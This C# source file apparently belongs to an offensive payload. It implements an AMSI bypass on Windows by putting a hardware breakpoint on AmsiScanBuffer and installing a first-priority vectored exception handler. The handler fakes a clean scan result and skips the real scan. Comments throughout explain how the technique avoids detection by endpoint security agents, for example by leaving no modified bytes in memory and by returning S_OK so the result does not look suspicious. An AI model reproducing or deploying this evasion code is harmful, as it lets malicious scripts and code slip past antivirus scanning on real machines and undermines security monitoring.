using System;
using System.Runtime.InteropServices;

namespace Nx
{
	/// <summary>
	/// Hardware-breakpoint alternative to the byte patch in Amsi.cs.
	///
	/// Why bother: the byte patch leaves four modified bytes sitting in a live
	/// system module. That is a durable artefact -- an agent can read the page,
	/// notice the prologue no longer matches the on-disk image, and either restore
	/// it or flag the process. Worse, "restored" and "never patched" look identical
	/// from user mode, so the payload cannot tell being disarmed from working.
	///
	/// What: the target's code is left exactly as Microsoft shipped it. A vectored
	/// exception handler is registered, a hardware execution breakpoint is pointed
	/// at the target on the calling thread, and the trap does the emulation. Nothing
	/// in any module's code or data is modified, so there is no page for an agent to
	/// compare against disk and nothing to restore.
	///
	/// Mechanism: the CPU raises EXCEPTION_SINGLE_STEP before executing the trapped
	/// instruction. The handler recognises its own breakpoint by comparing
	/// ExceptionAddress against the address it armed, emulates the target's return
	/// value and stack effect, and resumes the thread at the caller's return address
	/// so the target's body never runs.
	///
	/// Limits, stated plainly so nobody trusts this further than it goes:
	///   * debug registers are per-thread. Arming happens on whichever thread calls
	///     Arm(); other threads run the real target. In this payload that is the
	///     right scope -- plugin loads happen on the request thread -- but a target
	///     hit from a pool thread that was never armed is not intercepted.
	///   * any agent that also uses Dr0-Dr3, or that clears them, disarms this.
	///     IsArmed() exists so the caller can notice and fall back.
	///   * only four hardware breakpoints exist in the whole process, and agents and
	///     debuggers want them too. Spending one here is a real cost.
	/// </summary>
	internal static class Hwbp
	{
		private const int EXCEPTION_SINGLE_STEP = unchecked((int)0x80000004);
		private const int CONTINUE_SEARCH = 0;
		private const int CONTINUE_EXECUTION = -1;

		// CONTEXT.ContextFlags selecting the debug-register group. The architecture
		// bit differs between x64 (0x00100000) and x86 (0x00010000); both use 0x10
		// for the group itself.
		private const uint FLAGS_X64 = 0x00100010;
		private const uint FLAGS_X86 = 0x00010010;

		// Field offsets inside CONTEXT. Read and written by offset rather than
		// through a declared struct: the x64 CONTEXT is 0x4D0 bytes of mostly
		// unused registers, and a packing mistake in a hand-written layout
		// corrupts the thread's register file silently.
		private const int OFF_FLAGS_X64 = 0x30;
		private const int OFF_DR0_X64 = 0x48;
		private const int OFF_DR7_X64 = 0x70;
		private const int OFF_RAX_X64 = 0x78;
		private const int OFF_RSP_X64 = 0x98;
		private const int OFF_RIP_X64 = 0xF8;
		private const int SIZE_X64 = 0x4D0;

		private const int OFF_FLAGS_X86 = 0x00;
		private const int OFF_DR0_X86 = 0x04;
		private const int OFF_DR7_X86 = 0x18;
		private const int OFF_EAX_X86 = 0xB0;
		private const int OFF_ESP_X86 = 0xC4;
		private const int OFF_EIP_X86 = 0xB8;
		private const int SIZE_X86 = 0x2CC;

		// AmsiScanBuffer's fifth argument sits past the four register arguments in
		// the caller's frame: one return address plus 0x20 of shadow space on x64,
		// four stack arguments on x86.
		private const int ARG_RESULT_X64 = 0x28;
		private const int ARG_RESULT_X86 = 0x14;
		private const int ARG_TAIL_X86 = 0x18;   // return address + 5 stdcall arguments

		private static readonly object gate = new object();
		private static Native.VehDelegate handler;   // static: the marshalled thunk dies with it
		private static IntPtr veh = IntPtr.Zero;
		private static IntPtr context = IntPtr.Zero; // 16-byte aligned, see EnsureContext()
		private static IntPtr contextRaw = IntPtr.Zero;
		private static IntPtr target = IntPtr.Zero;
		private static string lastError = "not attempted";

		internal static string LastError()
		{
			return lastError;
		}

		/// <summary>
		/// Trap target on the calling thread, registering the handler on first use.
		/// Returns false when the thread context cannot be set -- an agent holding
		/// the debug registers, or a policy that blocks it -- leaving lastError set.
		/// </summary>
		internal static bool Arm(IntPtr address)
		{
			lock (gate)
			{
				try
				{
					if (address == IntPtr.Zero)
					{
						lastError = "no address";
						return false;
					}
					target = address;

					if (handler == null)
					{
						handler = new Native.VehDelegate(OnException);
					}
					if (veh == IntPtr.Zero)
					{
						// first = 1 puts us ahead of every other vectored handler,
						// including any an agent installed before us
						veh = Native.AddVectoredExceptionHandler(1, handler);
						if (veh == IntPtr.Zero)
						{
							lastError = "handler refused";
							return false;
						}
					}
					return Point();
				}
				catch (Exception ex)
				{
					lastError = "error: " + ex.Message;
					return false;
				}
			}
		}

		/// <summary>True when this thread still has the breakpoint pointed at the
		/// address Arm() was last given. Cheap enough to call on every request.</summary>
		internal static bool IsArmed()
		{
			lock (gate)
			{
				if (veh == IntPtr.Zero || target == IntPtr.Zero || context == IntPtr.Zero)
				{
					return false;
				}
				try
				{
					if (!Fetch())
					{
						return false;
					}
					long dr0 = Native.X64
						? Marshal.ReadInt64(context, OFF_DR0_X64)
						: (long)Marshal.ReadInt32(context, OFF_DR0_X86);
					long dr7 = Native.X64
						? Marshal.ReadInt64(context, OFF_DR7_X64)
						: (long)Marshal.ReadInt32(context, OFF_DR7_X86);

					// bit 0 is L0, the local-enable for the Dr0 slot
					return dr0 == target.ToInt64() && (dr7 & 1L) != 0L;
				}
				catch (Exception)
				{
					return false;
				}
			}
		}

		/// <summary>Drop the handler and the breakpoint. Not used by the payload --
		/// once armed it stays armed for the life of the process -- but the harness
		/// needs it to leave a clean process behind.</summary>
		internal static void Disarm()
		{
			lock (gate)
			{
				try
				{
					if (context != IntPtr.Zero && veh != IntPtr.Zero)
					{
						if (Fetch())
						{
							long dr7 = Native.X64
								? Marshal.ReadInt64(context, OFF_DR7_X64)
								: (long)Marshal.ReadInt32(context, OFF_DR7_X86);
							WritePtr(OFF_DR0_X64, OFF_DR0_X86, 0L);
							WritePtr(OFF_DR7_X64, OFF_DR7_X86, dr7 & ~1L);   // drop L0 only
							Store();
						}
					}
					if (veh != IntPtr.Zero)
					{
						Native.RemoveVectoredExceptionHandler(veh);
						veh = IntPtr.Zero;
					}
					target = IntPtr.Zero;
				}
				catch (Exception)
				{
				}
			}
		}

		/// <summary>
		/// Point Dr0 at the target on the current thread and enable the L0 slot.
		/// Dr7 is read-modify-write: other slots may belong to an agent or a
		/// debugger, and clearing them would be both rude and conspicuous.
		/// </summary>
		private static bool Point()
		{
			if (!EnsureContext())
			{
				return false;
			}
			if (!Fetch())
			{
				return false;
			}

			WritePtr(OFF_DR0_X64, OFF_DR0_X86, target.ToInt64());

			long dr7 = Native.X64
				? Marshal.ReadInt64(context, OFF_DR7_X64)
				: (long)Marshal.ReadInt32(context, OFF_DR7_X86);
			// L0 = 1, RW0 = 00 (break on execution), LEN0 = 00 (one byte)
			WritePtr(OFF_DR7_X64, OFF_DR7_X86, dr7 | 1L);

			return Store();
		}

		private static bool EnsureContext()
		{
			if (context != IntPtr.Zero)
			{
				return true;
			}
			int size = Native.X64 ? SIZE_X64 : SIZE_X86;
			// CONTEXT must be 16-byte aligned or GetThreadContext fails with
			// ERROR_NOACCESS; AllocHGlobal promises nothing better than heap
			// alignment, so over-allocate and round up by hand.
			contextRaw = Marshal.AllocHGlobal(size + 16);
			if (contextRaw == IntPtr.Zero)
			{
				lastError = "no context buffer";
				return false;
			}
			long baseAddr = contextRaw.ToInt64();
			context = new IntPtr((baseAddr + 15L) & ~15L);

			// Zeroed once. ContextFlags limits both GetThreadContext and
			// SetThreadContext to the debug-register group, so nothing outside that
			// group is ever read back or written out and stale bytes cannot leak
			// into the register file.
			byte[] zero = new byte[size];
			Marshal.Copy(zero, 0, context, size);
			return true;
		}

		private static bool Fetch()
		{
			Marshal.WriteInt32(context, Native.X64 ? OFF_FLAGS_X64 : OFF_FLAGS_X86,
				(int)(Native.X64 ? FLAGS_X64 : FLAGS_X86));
			if (!Native.GetThreadContext(Native.GetCurrentThread(), context))
			{
				lastError = "GetThreadContext failed: " + Marshal.GetLastWin32Error();
				return false;
			}
			return true;
		}

		private static bool Store()
		{
			// GetThreadContext may narrow ContextFlags on the way out; set it again
			// so the debug-register group is what gets written back
			Marshal.WriteInt32(context, Native.X64 ? OFF_FLAGS_X64 : OFF_FLAGS_X86,
				(int)(Native.X64 ? FLAGS_X64 : FLAGS_X86));
			if (!Native.SetThreadContext(Native.GetCurrentThread(), context))
			{
				lastError = "SetThreadContext failed: " + Marshal.GetLastWin32Error();
				return false;
			}
			lastError = "none";
			return true;
		}

		private static void WritePtr(int off64, int off32, long value)
		{
			if (Native.X64)
			{
				Marshal.WriteInt64(context, off64, value);
			}
			else
			{
				Marshal.WriteInt32(context, off32, (int)value);
			}
		}

		/// <summary>
		/// The vectored handler. Runs on the faulting thread with the exception
		/// records live, so it must be short and must not throw: an exception
		/// escaping here is an unhandled exception in the middle of the CLR's load
		/// path, which is exactly the crash this module exists to avoid.
		/// </summary>
		private static int OnException(IntPtr info)
		{
			try
			{
				// EXCEPTION_POINTERS { EXCEPTION_RECORD*; CONTEXT*; }
				IntPtr record = Marshal.ReadIntPtr(info, 0);
				IntPtr ctx = Marshal.ReadIntPtr(info, IntPtr.Size);
				if (record == IntPtr.Zero || ctx == IntPtr.Zero)
				{
					return CONTINUE_SEARCH;
				}

				// EXCEPTION_RECORD { DWORD code; DWORD flags; RECORD* nested;
				//                    PVOID address; DWORD count; ULONG_PTR info[15]; }
				if (Marshal.ReadInt32(record, 0) != EXCEPTION_SINGLE_STEP)
				{
					return CONTINUE_SEARCH;
				}
				IntPtr where = Marshal.ReadIntPtr(record, Native.X64 ? 16 : 12);
				if (where != target)
				{
					// somebody else's single-step or breakpoint: not ours to eat
					return CONTINUE_SEARCH;
				}

				return Emulate(ctx);
			}
			catch (Exception)
			{
				return CONTINUE_SEARCH;
			}
		}

		/// <summary>
		/// Return AMSI_RESULT_CLEAN from the trapped call without running it.
		///
		/// The fifth argument is the caller's AMSI_RESULT slot; zero is
		/// AMSI_RESULT_CLEAN. Fill it in and return S_OK rather than failing the
		/// call: a clean scan reporting success is what the caller would have seen
		/// from a real scan of benign content, whereas a failure code is a shape the
		/// runtime is entitled to treat as suspicious, and some callers do.
		///
		/// The stack has to be unwound by hand because the target's own epilogue
		/// never runs. On x64 that is just the return address. On x86 the targets
		/// are stdcall, so the arguments come off too, or the caller's frame is
		/// short by 0x14 and the next return jumps somewhere arbitrary.
		/// </summary>
		private static int Emulate(IntPtr ctx)
		{
			long sp = Native.X64
				? Marshal.ReadInt64(ctx, OFF_RSP_X64)
				: (long)(uint)Marshal.ReadInt32(ctx, OFF_ESP_X86);

			IntPtr resultSlot = Marshal.ReadIntPtr(new IntPtr(sp), Native.X64 ? ARG_RESULT_X64 : ARG_RESULT_X86);
			if (resultSlot != IntPtr.Zero)
			{
				Marshal.WriteInt32(resultSlot, 0);           // AMSI_RESULT_CLEAN
			}

			IntPtr ret = Marshal.ReadIntPtr(new IntPtr(sp), 0);

			if (Native.X64)
			{
				Marshal.WriteInt64(ctx, OFF_RAX_X64, 0L);    // S_OK
				Marshal.WriteInt64(ctx, OFF_RSP_X64, sp + 8L);
				Marshal.WriteInt64(ctx, OFF_RIP_X64, ret.ToInt64());
			}
			else
			{
				Marshal.WriteInt32(ctx, OFF_EAX_X86, 0);     // S_OK
				Marshal.WriteInt32(ctx, OFF_ESP_X86, (int)(sp + ARG_TAIL_X86));
				Marshal.WriteInt32(ctx, OFF_EIP_X86, ret.ToInt32());
			}

			return CONTINUE_EXECUTION;
		}
	}
}
